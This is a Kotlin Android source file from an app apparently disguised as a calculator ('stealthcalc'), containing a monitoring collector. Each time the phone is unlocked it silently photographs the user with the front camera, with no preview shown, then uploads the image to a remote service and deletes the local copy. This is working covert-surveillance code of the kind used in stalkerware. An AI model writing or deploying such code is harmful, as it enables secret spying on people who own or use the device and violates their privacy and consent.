package com.stealthcalc.monitoring.collector

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import androidx.core.content.ContextCompat
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.network.FileUploader
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class FaceCaptureCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
    private val uploader: FileUploader,
) {
    private val scope = CoroutineScope(Dispatchers.IO)
    private var receiver: BroadcastReceiver? = null
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null

    fun start() {
        if (!repository.isMetricEnabled("face_capture")) return
        if (receiver != null) return
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) !=
            PackageManager.PERMISSION_GRANTED) return

        cameraThread = HandlerThread("FaceCapture").apply { start() }
        cameraHandler = Handler(cameraThread!!.looper)

        receiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                if (intent.action == Intent.ACTION_USER_PRESENT) {
                    scope.launch { captureFromFrontCamera() }
                }
            }
        }
        context.registerReceiver(receiver, IntentFilter(Intent.ACTION_USER_PRESENT))
    }

    fun stop() {
        receiver?.let { runCatching { context.unregisterReceiver(it) } }
        receiver = null
        cameraThread?.quitSafely()
        cameraThread = null
        cameraHandler = null
    }

    @Suppress("MissingPermission")
    private suspend fun captureFromFrontCamera() {
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

        val frontCameraId = cameraManager.cameraIdList.firstOrNull { id ->
            val chars = cameraManager.getCameraCharacteristics(id)
            chars.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
        } ?: return

        val handler = cameraHandler ?: return

        val reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)

        val latch = java.util.concurrent.CountDownLatch(1)
        var capturedFile: File? = null

        reader.setOnImageAvailableListener({ imgReader ->
            val image = imgReader.acquireLatestImage() ?: return@setOnImageAvailableListener
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            image.close()

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val file = File(context.cacheDir, "face_$timestamp.jpg")
            file.writeBytes(bytes)
            capturedFile = file
            latch.countDown()
        }, handler)

        runCatching {
            cameraManager.openCamera(frontCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                        addTarget(reader.surface)
                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                    }

                    camera.createCaptureSession(
                        listOf(reader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(
                                        session: CameraCaptureSession,
                                        request: CaptureRequest,
                                        result: android.hardware.camera2.TotalCaptureResult
                                    ) {
                                        session.close()
                                        camera.close()
                                    }
                                }, handler)
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                camera.close()
                                latch.countDown()
                            }
                        },
                        handler
                    )
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    latch.countDown()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    latch.countDown()
                }
            }, handler)
        }.onFailure { e ->
            AppLogger.log(context, "[agent]", "Face capture camera error: ${e.message}")
            latch.countDown()
        }

        latch.await(5, java.util.concurrent.TimeUnit.SECONDS)
        reader.close()

        val file = capturedFile ?: return
        scope.launch {
            val success = uploader.uploadFile(
                file = file,
                mimeType = "image/jpeg",
                category = "face_capture",
                capturedAt = System.currentTimeMillis(),
            )
            file.delete()
            if (success) {
                AppLogger.log(context, "[agent]", "Face capture uploaded on unlock")
            }
        }
    }
}
